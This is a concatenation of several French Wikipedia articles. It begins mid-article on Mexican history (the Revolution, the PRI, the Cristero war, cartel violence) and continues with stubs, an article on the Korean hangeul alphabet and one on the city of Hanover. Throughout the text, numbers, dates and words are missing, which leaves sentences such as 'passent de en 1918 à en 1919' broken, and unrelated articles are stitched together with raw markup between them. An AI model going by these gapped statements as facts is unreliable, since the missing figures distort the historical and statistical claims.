Une première rébellion militaire fomentée par Bernardo Reyes et Félix Diaz est vaincue : les deux généraux sont emprisonnés.
Au sud de Mexico les partisans de Zapata se soulèvent contre lui, dans le but de le destituer et de le juger comme traître à la Révolution , reprennent possession des terres spoliées, en application du Plan de Ayala.
Il envoie le général Victoriano Huerta les combattre.
L'ambassadeur américain, auparavant un appui dans sa conquête du pouvoir, le voyant abandonné par une partie de ses anciens partisans, décide d'entraîner son renversement, de concert avec des milieux économiques qui ne bénéficient pas de sa politique, et une partie de la hiérarchie militaire.
En février 1913, il est renversé par un coup d’État puis assassiné.
Après la décade tragique le général Victoriano Huerta, qui s'est emparé du pouvoir, soutenu par une partie de la bourgeoisie porfiriste, une partie du Clergé et des investisseurs tant étrangers que mexicains, doit faire face à l'opposition déterminée du gouvernement des États-Unis, Woodrow Wilson qui refuse de reconnaître son gouvernement, plutôt favorable aux intérêts européens, notamment britanniques et allemands, bloquant les livraisons d'armes et de matériel lui étant destinés, (voir : incident de Tampico et l'occupation américaine de Veracruz) et à l'intérieur, celle des anciens partisans de Madero, de Venustiano Carranza gouverneur de l’État de Coahuila, Pancho Villa, qui a repris les armes dans l'État de Chihuahua et Emiliano Zapata, qui ne s'est jamais soumis, au Morelos.
Après plusieurs défaites de l'armée fédérale au printemps 1914, Huerta qui entre-temps menace les États-Unis d'armer les noirs du Sud et d'envoyer l'armée mexicaine sur Washington et de planter le drapeau du Mexique sur le Capitole, quitte le pays au mois de juillet.
Des fractures apparaissent rapidement entre les différentes factions révolutionnaires, carrancistes, villistes et zapatistes.
Réunies lors de la Convention d'Aguascalientes en octobre 1915, ces factions n'arrivent pas à un accord durable et les combats reprennent entre elles.
En 1915, le meilleur général carranciste, Álvaro Obregón, affronte et défait Pancho Villa au cours de plusieurs batailles dans le centre du pays.
Emiliano Zapata, qui a conclu une alliance éphémère avec Villa, est réduit à la défensive au Morelos.
En 1916, après la bataille de Columbus l'armée américaine intervient en territoire mexicain pour tenter, sans succès, d'éliminer Pancho Villa.
En 1916, Venustiano Carranza reste le seul à pouvoir prétendre au pouvoir suprême, même s'il ne contrôle pas l'ensemble du pays et qu'il doit faire face à d'énormes problèmes socio-économiques.
Après la promulgation d'une nouvelle constitution en 1917, Carranza est élu président.
Devenu progressivement impopulaire, il est renversé en 1920 par le dernier coup d’État de la révolution, organisé par les partisans d'Obregón, qui est ensuite élu président.
Le PRI au pouvoir (1929-2000).
En 1928 est fondé le Parti national révolutionnaire (PNR), qui va devenir le PRM en 1938 puis le PRI en 1946. Ce parti prend le pouvoir en 1929 et le garde jusqu'en 2000 et le sera à nouveau de 2006 à fin 2018.
Sous les gouvernements de Plutarco Elías Calles et d'Emilio Portes Gil, la réforme agraire reconnue par la Constitution de 1917 commence à être mise en application. Les ouvriers se regroupent progressivement au sein de la "", favorable au gouvernement, et dont les effectifs passent de en 1918 à en 1919, en 1920 et près d'un million en 1924. Les conditions de vie s'améliorent et le taux de mortalité infantile tombe de à entre 1923 et 1931. Un sérieux effort est fait en faveur de l'éducation. Le budget de l'éducation s’élève à 14 % des dépenses de l’État et le nombre des écoles rurales est triplé. Le taux d'alphabétisation des plus de passe de 25 % en 1924 à 51 % en 1930.
À partir de 1926, en raison à la fois des mesures anticléricales découlant de l'application de la Constitution mexicaine de 1917 par le président Plutarco Elías Calles, la guerre des Cristeros opposa les troupes gouvernementales issues de la Révolution aux paysans militants catholiques.
La guerre des Cristeros (également connue sous le nom de Cristiada) désigne le soulèvement d'une partie de la population mexicaine, catholiques, de 1926 à 1929. Cette rébellion éclate d'abord de façon locale et spontanée avant de se transformer en soulèvement plus important à l'appel de la Ligue le  janvier 1927. À son apogée, au printemps 1929, le mouvement compte : sont placées sous le commandement du général Gorostieta, constituent des bandes éparses. Il apparaît plus important dans le centre et l'ouest du pays. Pour des raisons militaires, politiques et économiques, l’État mexicain décide alors d'en finir en concluant un accord diplomatique avec l’Église grâce à l'entremise de l'ambassadeur américain  : ce sont les arreglos du . Les cristeros doivent alors se démobiliser et déposer les armes.
Le nom de Cristeros est d'abord un sobriquet donné aux insurgés par les soldats fédéraux mais les combattants se l'approprient rapidement. Il reprend leur cri de ralliement : "Viva Cristo Rey!"
Le soulèvement des cristeros en désaccord avec la constitution de 1917 aurait fait entre et parmi les combattants d'après Jean Meyer : pour les fédéraux et pour les cristeros. Sans compter un lourd bilan pour la population civile, beaucoup plus difficile à évaluer : les statistiques officielles mexicaines avancent le chiffre de . De nombreux civils ou anciens insurgés, mais aussi des prêtres, seront tués dans des raids anticatholiques dans les années suivant la fin de la guerre, certaines autorités locales maintenant également une forte pression sur le clergé de leur zone de compétence. La pression ira en diminuant au cours des années 1930, mais ne se stabilisera complètement qu'après l'élection en 1940 du Président Manuel Ávila Camacho, lui-même un catholique pratiquant, et représentant de l'aile droite du régime.
Il faudra beaucoup de temps pour que le clergé se reconstitue. Entre 1926 et 1934, on ne dénombre pas moins de assassinés, beaucoup d'autres ayant fui le pays. Sur les 4 500 prêtres opérant avant la rébellion, seuls 334 servent encore officiellement en 1934. En 1935, dix-sept États ne comptent plus un seul religieux.
En 1928 le successeur à la présidence de la République, le général Álvaro Obregón est assassiné par un militant catholique.
En 1938, le président Lázaro Cárdenas nationalise la production de pétrole en créant Pemex au détriment des compagnies pétrolières américaines. Les États-Unis pratiquent alors un embargo mais se firent finalement livrer du pétrole pendant la Seconde Guerre mondiale grâce à l'octroi de crédits accordés par Franklin Delano Roosevelt à la Pemex dès 1939. À la fin de la Guerre d'Espagne, le gouvernement mexicain offre l'asile aux opposants à Franco.
La mise en place d'un système assimilé au corporatisme, fortement lié à la société civile mexicaine, aux syndicats et aux entreprises, permet au parti d'assurer la pérennité et le progrès de la Nation durant .
Le , sous le gouvernement de Manuel Ávila Camacho, le Mexique entre dans la Seconde Guerre mondiale aux côtés des Alliés en déclarant la guerre à l'Allemagne, à la suite du refus de l'Allemagne de payer des dommages et intérêts pour avoir coulé deux navires mexicains en mai 1942. L'aviation mexicaine (escadrille 201 - Escuadrón 201) participe à la Guerre du Pacifique.
En octobre 1968, l’armée ouvre le feu sur des manifestations étudiantes d’extrême gauche. Plus de trois cents manifestants sont tués et des centaines disparaissent lors du massacre de Tlatelolco.
Le , la police antiémeutes s'attaque violemment à une manifestation d'étudiants réclamant la fin de l’impunité et un pays plus démocratique. Des dizaines de manifestants sont tués ou disparaissent dans cette attaque.
Carlos Salinas de Gortari, candidat du PRI, remporte l’élection présidentielle de 1988 contre le candidat du PRD Cuauhtémoc Cárdenas. Dans le but de réduire les doutes et les contestations électorales, habituelles au Mexique, l'Institut fédéral électoral est créé au début des années 1990 pour organiser les élections et en assurer le bon déroulement.
La campagne électorale de 1994 est marquée par l'assassinat de Luis Donaldo Colosio.
L'année 1994 est également marquée par plusieurs évènements. D'une part, l'Accord de libre-échange nord-américain (ALENA), accord de libre-échange entre les trois pays d'Amérique du Nord, entre en vigueur le janvier ; d'autre part, Ernesto Zedillo succède à Carlos Salinas à la présidence ; enfin, une récession temporaire décidée par Zedillo entraîne une très forte dévaluation du peso.
Le , entre alternances politiques et violences liées à la drogue.
Des élections présidentielles et législatives ont lieu le . Vicente Fox Quesada (1942-), membre du PAN (Partido Acción Nacional), remporte l’élection présidentielle et devient le premier président n'appartenant pas au PRI depuis plus de . En effet, Vicente Fox recueille 43 % des voix, alors que Francisco Labastida Ochoa (1942-) (PRI) obtient 37 % des suffrages et Cuauhtémoc Cárdenas 17 % (Partido de la Revolución Democrática) ; le PRI et le PRD sont membres de l'Internationale socialiste.
Le PRI obtient à la Chambre des députés et 60 au Sénat, le PAN 208 et 46, le PRD 51 et 15.
En 2003, la crise irakienne met le gouvernement dans une situation quelque peu délicate : 80 % des exportations mexicaines vont aux États-Unis, À cette époque, le Mexique occupe l'un des quinze sièges du Conseil de sécurité des Nations unies, et va d'ailleurs en assurer la présidence en avril 2003. Dans le même temps, les États-Unis refusent de régulariser la situation des quelque quatre millions de clandestins mexicains se trouvant sur leur territoire. Ce désintérêt soudain des États-Unis, remonte au brusque renforcement de la politique migratoire depuis les attentats du . Tout ceci va à l'encontre de la promesse de Vicente Fox d'obtenir un accord migratoire avec George W. Bush, et déçoit profondément le gouvernement et l'opinion mexicaine.
Le lundi , le Mexique signe le Traité sur la non-prolifération des armes nucléaires et s'engage donc à autoriser des inspections surprises de l'Agence internationale de l'énergie atomique. Le Mexique devient le à adhérer à ce pacte.
En juillet 2006 a lieu l’élection présidentielle qui donne le parti sortant, le PAN (démocrate-chrétien), vainqueur.
Le perdant, comme il est d'habitude au Mexique, dépose un document démontrant plusieurs centaines de fraudes et irrégularités lors des élections et de la campagne qui les a précédés. Des anomalies toutes simples comme des erreurs arithmétiques (par exemple nombre de votants supérieur ou inférieur au nombre de bulletins déposés) sont mises en avant (les mêmes « erreurs » sont détectées en faveur du PRD). Le Tribunal fédéral électoral confirme cependant la victoire du candidat du PAN, au détriment du PRD.
Les trafiquants se livrent entre eux à une guerre sans merci pour le monopole du transit par le Mexique et le passage vers les États-Unis de la drogue provenant principalement d'Amérique du Sud. Cette guerre entre cartels fait depuis 2006 entre chaque année parmi leurs membres. Le chiffre officiel pour l'année 2008 est de . Selon les chiffres officiels, l'année 2017 est la plus violente en deux décennies avec 25.339 homicides enregistrés. 2018 est encore plus violente, avec 35.964 meurtres recensés (, , non-spécifiés), ce qui fait une moyenne de par jour, sans compter les disparitions. Le , la Garde nationale du Mexique commence à se créer en absorbant la police fédérale, la Gendarmerie nationale mexicaine et la police navale (la police militaire de la Marine mexicaine) afin de lutter plus efficacement contre les cartels. L'idée est de limiter le nombre d'intermédiaires dans la chaîne de commandement, afin d'améliorer la coordination entre les différents types d'unités, tout en limitant les risques de corruption.
La corruption représente un défi majeur pour l’économie mexicaine : d'après des études de la Banque mondiale, la corruption politique et économique pourrait représenter 9 % du PIB. En dépit de l’augmentation du PIB (2,1 % en moyenne entre 2012 et 2014) les revenus des ménages ont baissé de 3,5 % au cours de cette période. Une grande partie des richesses produites étant captées par les grandes fortunes. Selon l’organisation Oxfam, les quatre plus grandes fortunes représentent en 2017 9,5 % du PIB mexicain, contre 2 % en 2002.
Au cours de la crise migratoire en Amérique centrale qui démarre en 2018 à cause de la sécheresse et de l'ultra-violence des gangs au Honduras, au Salvador et au Guatemala, le Mexique devient le premier pays de passages des caravanes de migrants en Amérique, et de fait le premier pays d'accueil puisque de nombreux migrants restent bloqués à la frontière entre les États-Unis et le Mexique.
Mexique au cinéma de fiction.
En visualisant ces films, on s'aperçoit qu'ils sont truffés d'erreurs sur les personnes, la situation politique, d'anachronismes (armes, vêtements et uniformes, poids et mesures, équipements, ordre de bataille et chaîne de commandement des troupes..) confusions géographiques et historiques, heures des batailles, etc.

</doc>
<doc id="1419" url="https://fr.wikipedia.org/wiki?curid=1419" title="Heryshef">
Heryshef



</doc>
<doc id="1420" url="https://fr.wikipedia.org/wiki?curid=1420" title="Herichef">
Herichef



</doc>
<doc id="1422" url="https://fr.wikipedia.org/wiki?curid=1422" title="Heure (homonymie)">
Heure (homonymie)

Le sens le plus courant du mot heure est celui d'une unité de temps, égale à un vingt-quatrième de jour, soixante minutes ou .
Sciences humaines et sociales.
En histoire :

</doc>
<doc id="1423" url="https://fr.wikipedia.org/wiki?curid=1423" title="Hangeul">
Hangeul

Le hangeul ( ), aussi orthographié hangûl ou hangul en français, appelé josŏn'gŭl en Corée du Nord, est l’alphabet officiel du coréen, à la fois en Corée du Nord et en Corée du Sud. Le hangeul est fréquemment cité pour son histoire particulière : créé au par le roi Sejong le Grand, il est interdit à sa mort, mais perpétué entretemps par les romans féminins avant d'être réintroduit à la fin du sous l'occupation japonaise. 
Le terme "hangeul" date du . Il s'écrit en hangeul, mais il s'est notamment fait appeler "eonmun" (언문 en hangeul, en hanja). Le terme signifie, d'après les caractères hanja, « écriture ou langue () des proverbes () ». En coréen, on peut aussi l'interpréter comme signifiant « écriture ou langue (/) grandiose (/) ».
Pour des raisons politiques, la Corée du Nord a choisi le terme Josŏn'gŭl (en hangeul : , translittéré "" selon la romanisation révisée du coréen utilisée en Corée du Sud) en référence à la période Joseon qui représente la Corée historique, ce qui se traduirait mot à mot par « l'écriture/la langue Josŏn », mais aussi parce qu'en Corée du Nord la Corée est appelée Joseon (en hangeul : 조선). Une autre appellation existe également : , « nos caractères ».
Histoire.
Cette écriture construite est ordonnée vers 1443 par le roi Sejong le Grand pour les lettrés du Jipyeonjeon afin de favoriser l’alphabétisation du peuple et notamment des femmes, puis promulguée par ce même roi en 1446 en remplacement des hanja (caractères chinois utilisés jusque-là).
Cette écriture est interdite en 1504 par le successeur de Sejong le Grand, Yeonsangun, et enfin réhabilitée en 1894. Son emploi se généralise après la Seconde Guerre mondiale et permet d’atteindre très rapidement des taux d’alphabétisation parmi les plus élevés du monde à cette époque, dans les deux Corées.
: contexte de création du hangeul.
La langue coréenne s’est développée oralement pendant des siècles, et ferait partie de la famille controversée des langues altaïques. Les similitudes avec les langues japonaises ont été étudiées.
À partir du , sous l’influence de la Chine et du bouddhisme, des systèmes de transcription du coréen en caractères chinois, appelés hanja en coréen, se sont développés : idu, kugyol et hyangch'al.
Quand Sejong le Grand, quatrième roi de la dynastie Yi, accède au trône, le territoire du royaume occupe la plus grande partie de la péninsule coréenne. Cependant, seules l’aristocratie et l’administration ont alors assez d’éducation pour apprendre à lire les hanja, en raison de la complexité de ce système d'écriture (plusieurs milliers de caractères). Sejong voit dans cette situation le nœud du problème de l’illettrisme du peuple.
Sejong, s’étant entouré de savants spécialistes de divers domaines scientifiques (une tradition confucéenne d’érudition des souverains), et ayant mené avec succès plusieurs réformes, élabore alors le hangeul, qu’il nomme hunmin jongum (/, les « sons corrects pour l’éducation du peuple »), qu’il dévoile et promulgue le dans un ouvrage portant le même nom, assez court et rédigé en chinois classique. La nouvelle écriture rencontre dès ses premiers jours une forte opposition des intellectuels qui considèrent les hanja comme la seule écriture légitime pour transcrire le coréen et la baptisent de plusieurs noms plus ou moins méprisants (comme "onmun" (), écriture vernaculaire). Plus tard, c’est au tour des gouvernements successifs d’être hostiles au hangeul, qui, du dire même de ses détracteurs, "a posteriori", et risque de .
L’élaboration du hunmin jongum s’est probablement faite en secret et sans l’aide de l’académie de Sejong, contrairement à ce qui a longtemps été enseigné. Les conseillers les plus conservateurs ont d’ailleurs fortement reproché au roi de l’avoir inventé secrètement, sans consulter aucun savant, peut-être par peur de l’opposition des classes cultivées ; .
La théorie du lien avec l'écriture tibétaine.
Étant établi que Sejong avait quelque connaissance des écritures tibétaine, mongole et japonaise, elles aussi remplaçant des caractères chinois, il est parfois suggéré qu’il se soit inspiré des deux premières. Cependant, pour la logique sous-jacente au tracé hangeul, son travail est, même à présent, novateur.
Une première association avec l'écriture tibétaine est proposée par l'orientaliste (sinologue, mongoliste, tibétologue et turcologue) français Jean-Pierre Abel-Rémusat entre l'alphasyllabaire tibétain et le coréen. Il montre notamment la similitude entre le b (coréen ㅂ, tibétain བ), le p (coréen ᇁ, tibétain པ), le l (coréen ㄹ, tibétain ལ) et la fonction du ng (coréen ㅇ) .
Le dessin des caractères est lié aux caractéristiques des sons qu'ils représentent et décrit la forme prise par les organes vocaux. Selon , cinq des de base (ㄱ, ㄷ, ㄹ, ㅂ, ㅈ) seraient dérivées de l'écriture phags-pa, dérivée du tibétain, qui avait été utilisée par les dirigeants mongols de la dynastie Yuan, régnant sur la Chine entre 1270 et 1360.
: interdiction.
En 1504, le roi Yeonsangun interdit l’usage et l’apprentissage du hangeul après avoir été ridiculisé et critiqué en hangeul. Il bannit les documents rédigés avec ce système d'écriture. En 1506, le roi Jungjong supprime le ministère de l’écriture vernaculaire. Le hangeul se perpétue ensuite grâce aux femmes et aux sujets non éduqués, qui n’ont pas accès aux études chinoises. À partir du , le hangeul fait naître la littérature romanesque féminine, mais reste méprisé dans les secteurs officiels du pays.
à nos jours : réhabilitation.
En 1894, les autorités japonaises imposent au royaume de Joseon la réforme administrative dite de l'an Kabo (1894 dans le calendrier chinois) qui prévoit l'abandon du système administratif à la chinoise ainsi que l'adoption du coréen moderne comme langue officielle en lieu et place du chinois écrit. Il est adopté dans les documents administratifs pour la première fois, peu avant que le Japon ne fasse de la Corée un protectorat, puis l’annexe. Le terme "hangeul" est utilisé pour la première fois en 1912 par Ju Si-gyeong (/) et signifie à la fois « la grande écriture » en coréen archaïque et « écriture de la Corée » en coréen moderne. Le hangeul est associé à la résistance contre l'envahisseur, et à la fin de la Seconde Guerre mondiale, le Japon une fois vaincu, l’écriture prend son essor et permet d’alphabétiser rapidement l’ensemble de la population malgré la partition du pays. Elle s'impose définitivement lorsque les Coréens accèdent au lycée et à l'université, les caractères chinois se révélant trop complexes. À partir de 1995, les journaux coréens cessent d'employer ces sinogrammes.
Le , jour de la commémoration de la promulgation du hangeul, est en Corée du Sud un jour de fête, appelé « journée du hangeul » (). En Corée du Nord, son équivalent, la « journée du chosŏn'gŭl » (), est célébré le .
Les hanja sont encore utilisés et enseignés aux écoliers coréens, mais la majorité des écrits coréens contemporains sont en hangeul. Les hanja peuvent être utilisés pour distinguer des homophones (également homographes en hangeul, puisque c'est une écriture phonétique), pour ajouter des nuances ou par parti pris.
En 2009, les autorités de la ville indonésienne de Baubau ont décidé d’adopter et d’adapter le hangeul pour écrire leur langue, le cia-cia, initiative qui a finalement été abandonnée au profit de l'alphabet latin, selon la loi indonésienne.
Clavier.
Il est possible de saisir du hangeul phonétiquement, comme avec un clavier QWERTY, grâce au clavier Dubeolsik Phonetic. Sur Android, il peut être installé via Heliboard, Florisboard ou FUTO Keyboard.
Description de l’écriture.
Le hangeul comprend , appelées "jamos" (, hanja : , les caractères mères).
Les jamos.
Les "jamos" sont divisés en plusieurs catégories :
On distingue par ailleurs de consonnes (/ / "").
Le tableau suivant classe toutes ces lettres :
Exemple : « » se lira "eobda" (le n’est pas prononcé) alors que « » se lira "eopseo" (le est prononcé).
Ordre alphabétique.
L’alphabet coréen ne mélange pas les consonnes et les voyelles. Comme aucun mot ne commence graphiquement par une voyelle, l’ordre des consonnes est le plus important, étant utilisé pour classer les mots dans un dictionnaire. L’ordre des voyelles vient ensuite pour classer les mots qui commencent par la même consonne.
1446, Hunmin Jeongeum.
Lors de la publication du "Hunmin Jeongeum" en 1446, l’alphabet coréen comptait au total. Les savants établirent donc le premier ordre alphabétique du hangeul, qui changera de nombreuses fois au cours de son histoire.
Les lettres désuètes seront vues plus en détail dans la partie "Jamos désuets".
1527, Choe Sejin.
En 1527, le linguiste coréen Choe Sejin (/) réorganisa l’alphabet en séparant les différents types de jamos.
Dans l’ordre des consonnes, les vélaires sont en premier, suivies des alvéolaires, des bilabiales, des fricatives et des glottales. Les consonnes aspirées sont en dernier. Dans l’ordre des voyelles, les diphtongues (, , et ) formées par la semi-voyelle "i-" et une voyelle simple (, , et ) sont placées après cette voyelle simple.
1751, Hong Gyehui.
En 1751, Hong Gyehui (/) propose le remplacement des jamos ' par ' en raison de la prononciation voisine, et ' par ' puisque le ' ne s’utilise qu’en fin de syllabe et ' qu’en début.
L’alphabet se réduit donc à .
1907, Institut de recherche de l’écriture nationale.
Un très petit changement eut lieu en 1907 du fait de l’Institut de Recherche de l’Écriture Nationale de Corée (). Le "ieung " a été déplacé au tout début de l’alphabet.
1933, Hangeul Matchumbeop.
En 1933, la "Société de linguistique coréenne", fondée par Ju Si-gyeong (/), établit les règles orthographiques et grammaticales du coréen dans un document intitulé "Hangeul Matchumbeop" (, "Orthographe du coréen"). Il y est inclus un nouvel ordre alphabétique : le ' est devenu ' (le trait le plus haut a disparu) et est revenu à son emplacement d’origine, la voyelle "" a été supprimée.
Divergence Corée du Nord - Corée du Sud.
Lorsque les deux Corées proclamèrent le hangeul comme étant leur écriture officielle, l’ordre fut arrangé pour pouvoir contenir les nouveaux jamos créés (consonnes doubles et voyelles composées).
Il existe maintenant deux ordres alphabétiques coréens : celui de la Corée du Nord et celui de la Corée du Sud.
En Corée du Nord.
En Corée du Nord, le classement des lettres est similaire aux précédents. Les nouveaux jamos (consonnes doubles et voyelles composées) ont simplement été ajoutés en fin d’alphabet dans le souci de respecter les ordres traditionnels.
En Corée du Sud.
En Corée du Sud, l'ordre diffère beaucoup de celui des anciens classements. Les lettres similaires ont été groupées, ce qui fait que les nouveaux jamos (consonnes doubles et voyelles composées) ont été dispersés après chaque ancienne lettre de base correspondante (consonne simple, voyelle simple ou diphtongue), contrairement au classement de Corée du Nord.
Origine des jamos.
Dans le "Hunmin Jeongeum", le roi Sejong le Grand expliqua que la création des jamos avait été inspirée par la forme de la bouche et les principes du Yin et du Yang.
Consonnes.
Dans l’alphabet coréen, les cinq consonnes ', ', ', ', symbolisent cinq différents types d’articulation des consonnes utilisés en coréen qui sont respectivement les vélaires, les alvéolaires, les bilabiales, les fricatives et les glottales.
De ces cinq consonnes principales, auxquelles se sont ajoutés des traits qui peuvent symboliser soit une aspiration, soit un appui de la consonne, sont issues d'autres consonnes :
Voyelles.
Pour la création des voyelles, trois traits différents étaient nécessaires :
La Terre et le Soleil sont deux forces opposées, mais complémentaires, suivant le principe du "Yin" et du "Yang". L’Homme est l’élément neutre.
Deux catégories de voyelles simples sont distinguées :
Les "jamos" du premier ensemble sont composés chacun d’un long trait horizontal ou vertical auquel on ajoutait un point "araea" (ㆍ), aujourd'hui un trait court. Leurs diphtongues respectives (', ', ', ') sont créées en ajoutant un point de plus.
Les jamos de l’autre ensemble sont le trait vertical seul (') [i] et le trait horizontal seul (') [eu].
Avec le temps, le point "araea" (ㆍ) initialement "Yang", ajouté aux anciennes voyelles pour distinguer des phonèmes, est devenu un trait court attaché à la voyelle de base, soit horizontalement (par exemple dans la voyelle ' ou la syllabe '), soit verticalement (par exemple dans la voyelle ' ou la syllabe ') ; sachant que les directions du "Yin" sont la gauche et le bas et que celles du "Yang" la droite et le haut, on peut distinguer, parmi les quatre jamos ' ' ' ' ainsi formés, que les voyelles "Yin" sont ', ' et les voyelles "Yang" sont ', '.
Pour symboliser les diphtongues [w-] présentes en coréen, de nouvelles lettres furent créées. Il s’agit de l’association des jamos ' ou ' avec une autre voyelle pour former six diphtongues :
Enfin, pour représenter les anciennes diphtongues en [-i], de nouvelles lettres ont été ajoutées en associant le jamo [i] après une autre voyelle :
Voici un tableau récapitulatif des différentes catégories de voyelles :
Jamos désuets.
De nombreux jamos ont servi à transcrire le chinois médiéval. Avec le temps, ces lettres furent oubliées. Cependant, certains dialectes coréens (comme celui de Jeju) utilisent encore des jamos désuets pour transcrire les phonèmes qui ont disparu du dialecte de Séoul.
Consonnes et voyelles composées.
Consonnes composées de deux jamos :
Consonnes composées de trois jamos :
Voyelles composées :
Détails sur le nom des jamos.
En 1527, Choe Sejin donna également un nom à tous les jamos après les avoir classés. Les noms des consonnes ont suivi un processus plus complexe que ceux des voyelles.
Nom des consonnes.
Chaque nom devait être en deux syllabes et respecter la structure "Jamo + son [i] + son [eu] + Jamo". Par exemple, ' a pour nom ' + ' + ' + ', ce qui, mis ensemble, donne ' ("nieun").
Choe attribuait également un nom en hanja équivalent. Dans cet exemple, l’équivalent hanja de ' est ' ("ni") ' ("eun"). Cette dernière règle posa un problème pour trois caractères : le ', le ', et le '. En effet, aucun hanja ne se prononçait "euk", "eut", ou "eus".
Le caractère ' ("yeok") fut choisi pour nommer ' car sa prononciation sino-coréenne se terminait par le son "k". Pour les deux autres jamos, Choe dut s’en référer à la prononciation coréenne des caractères &lt;!-- à moins que 

</doc>
<doc id="1425" url="https://fr.wikipedia.org/wiki?curid=1425" title="花">
花

 est un caractère chinois issu du chinois archaïque. Il est prononcé en mandarin, et peut signifier :
Il était également utilisé autrefois en coréen et vietnamien et l'est toujours en japonais.
En japonais, (fleur) est un kanji. Il fait partie des "kyōiku kanji" et est étudié en .
Il se lit か ("ka") en lecture "on" et はな ("hana") en lecture "kun".

</doc>
<doc id="1426" url="https://fr.wikipedia.org/wiki?curid=1426" title="Hanabi">
Hanabi

Hanabi peut faire référence à :

</doc>
<doc id="1427" url="https://fr.wikipedia.org/wiki?curid=1427" title="Hanovre">
Hanovre

Hanovre ( ; ) est une ville du nord de l'Allemagne, capitale du Land de Basse-Saxe et située au bord de la rivière Leine. Avec environ (2021), elle est la plus grande ville du Land et la troisième plus grande du Nord de l'Allemagne après Hambourg et Brême. Elle fait partie de la région métropolitaine de Hanovre-Brunswick-Göttingen-Wolfsbourg, la huitième d'Allemagne. Elle est également le siège de la région de Hanovre, un regroupement de 21 communes.
De plus, la ville est le siège de plusieurs établissements d'enseignement supérieur. Au parc d'exposition de Hanovre, le plus grand au monde, se déroulent chaque année des foires de renom.
Histoire.
Moyen Âge.
Hanovre est mentionnée pour la première fois dans un document daté de 1150. La ville n'est alors qu'un village de pêcheurs et de passeurs niché sur une terrasse surplombant la Leine (on peut traduire son nom originel, "Honovere", par « haute rive »). En 1241, le duc Otto de Hanovre promet que la ville ne sera plus un fief. Deux actes confirment ce privilège, à l'origine de l'apparition de la plus ancienne forme du droit communal de la ville de Hanovre.
Il y a à l'époque un important passage fluvial car deux anciennes grandes routes se croisent à cet endroit. Le village qu'est Hanovre se transforme vers la fin du Moyen Âge en une petite ville de foire et de commerce qui obtient bientôt ses droits communaux et est vendue à la maison princière des Welfs, lesquels font de Hanovre leur résidence définitive au .
La ville connaît rapidement une grande prospérité et devient cité hanséatique en 1368.
Au sont construites les principales églises de Hanovre. À la même époque, la ville est fortifiée par un solide mur d'enceinte. Quelques restes de ce mur sont encore visibles aujourd'hui dans la tour du Béguinage et au musée historique.
Époque moderne et contemporaine.
À partir du , Hanovre joue un rôle politique international considérable : en 1692, Ernst-August de Brunswick-Lunebourg est élevé à la dignité électorale et renomme ses possessions Hanovre. Son fils, qui lui succède en 1698, monte sur le trône de Grande-Bretagne sous le nom de Georges; cette union personnelle entre la couronne britannique et le duché de Hanovre procure à celui-ci un prestige considérable.
Pendant la Guerre de Sept Ans, en 1757, a lieu la bataille de Hastenbeck, au cours de laquelle l'armée française vainc l'armée de Hanovre. Cette défaite conduit à l'occupation provisoire de la ville.
En 1803, lors des guerres napoléoniennes, la ville est occupée par près de français. Elle est annexée le et intégrée à l'éphémère royaume de Westphalie confié à Jérôme Bonaparte.
Hanovre retrouve son indépendance et devient un royaume en 1815. Il partage toujours son souverain avec la Grande-Bretagne. À la mort du roi Guillaume IV du Royaume-Uni, la nièce du souverain monte sur le trône de Grande-Bretagne tandis que, régi par la loi salique, Hanovre échoit au frère du souverain défunt qui devient le roi Ernest-Auguste Ier de Hanovre. Son fils lui succède sous le nom de Georges V de Hanovre. Ayant soutenu l'Autriche lors de la Guerre austro-prussienne de 1866, le royaume est annexé par la Prusse, inspirant aux autochtones un puissant sentiment prussophobe. À cette même époque, Hanovre commence à se développer de façon considérable. Un nouveau centre-ville est même construit entre la gare et la vieille ville et une puissante expansion industrielle au cours des années de fondation de l'empire allemand, en 1871, s'ensuit.
Les conséquences de la Seconde Guerre mondiale sur la ville sont importantes. Les bombardements alliés laissent le centre-ville dans un état de dévastation totale. En 1945, presque deux tiers des bâtiments - dont le Palais de Herrenhausen - sont en ruines ou ont été détruits par les bombardements. Les sans-abris se font nombreux. Le conflit se termine pour Hanovre le , lorsque des troupes des États-Unis entrent dans la ville, sans mener de combat. Le déblaiement des ruines est suivi par la reconstruction qui progresse rapidement.
Après guerre.
Aujourd'hui, Hanovre se présente comme une ville moderne, avec de nombreux espaces verts. La ville compte d'importants aménagements culturels, de bons commerces et de remarquables événements interrégionaux comme les foires ou le "Schützenfest", fête annuelle des clubs de tir à l'arc de la région voire davantage ainsi que la fête du lac de Maschsee, qui est très réputée.
En 2000, la ville de Hanovre a accueilli l’exposition universelle ("Expo 2000").
Tourisme.
Il faut avant tout évoquer le "fil rouge" ("Der rote Faden") de de long, peint sur de nombreux trottoirs de Hanovre. Il relie les 36 principales curiosités touristiques du centre-ville et permet ainsi une visite touristique.
Au centre-ville, le nouvel hôtel de ville (construit en 1913) attire les touristes avec son ascenseur parabolique dans la coupole du haut de laquelle s'offre une vue sur la ville entière. Dans le hall, quatre maquettes montrent l'histoire de Hanovre du bourg fortifié au Moyen Âge jusqu'à la grande ville de nos jours, en passant par les destructions subies à la fin de la Seconde Guerre mondiale. Dans la salle du conseil municipal se trouve une fresque de Ferdinand Hodler sur le thème de l'unité (en allemand : "Einigkeit").
La vieille ville reconstruite invite à flâner dans les ruelles avec leurs cafés et boutiques dans les maisons à colombages typiques. La "Marktkirche" l'église du marché constitue le centre de la vieille ville, en face de l'ancien hôtel de ville datant du Moyen Âge, où se trouve aujourd'hui l'état civil. Sur la rive de la Leine, proche de l'ancien hôtel de ville, se situe le conseil régional ("Landtag") dans un bâtiment du style néoclassique.
Sur les rives de la Leine a lieu, tous les samedis matin, un marché aux puces traditionnel. On y trouve également les trois célèbres Nanas de Niki de Saint Phalle, artiste française, qui ont suscité un scandale au moment de leur édification en 1974 et qui ont ainsi formé le début d'une discussion nationale sur l'art dans les lieux publics.
La grande zone piétonne qui s'étend de la vieille ville à la gare centrale et tout le long de la Georgstraße invite au shopping dans ce quartier moderne de la ville.
Au-delà de la vieille ville se trouve le lac semi-artificiel "Maschsee" (creusé de 1935 à 1936 par des chômeurs appartenant au "Reichsarbeitsdienst"), zone verte en plein milieu de la grande ville, qui invite à des promenades, à pied ou en bateau. De nombreux cafés et locations de bateaux sont apparus le long des rives.
Le club de football professionnel Hannover 96 représente la ville en deuxième division allemande (2. Bundesliga). Son stade, l'ancien "Niedersachsenstadion" entièrement modernisé et rebaptisé "AWD-Arena" en 2004, a accueilli des matchs lors de la Coupe du monde de football en 2006. On entrevoit le stade depuis les rives du Maschsee.
